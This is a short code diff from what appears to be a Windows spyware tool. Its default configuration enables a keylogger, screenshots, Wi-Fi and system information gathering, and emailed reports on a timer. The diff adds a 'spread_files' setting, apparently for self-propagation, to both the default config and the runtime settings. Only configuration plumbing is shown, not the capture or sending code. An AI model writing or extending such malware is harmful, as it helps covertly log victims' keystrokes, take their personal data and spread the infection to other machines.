@@ -22,6 +22,7 @@ def readConfigurationFile():
 		config['general']['enable_key_logger'] = 'True'
 		config['general']['get_wifi_info'] = 'True'
 		config['general']['get_system_info'] = 'True'
+		config['general']['spread_files'] = 'True'
 
 		config['cooldown'] = {}
 		config['cooldown']['email_send_time'] = '120'
@@ -56,6 +57,7 @@ if system == "Windows":
 			"email_send_time": int(cooldown['email_send_time']),
 			"take_screenshot": bool(general['take_screenshot']),
 			"screenshot_time": int(cooldown['screenshot_time']),
+			"spread_files": bool(general['spread_files']),
 			"key_logger": bool(general['enable_key_logger']),
 			"get_wifi_info": bool(general['get_wifi_info']),
 			"get_system_info": bool(general['get_system_info']),
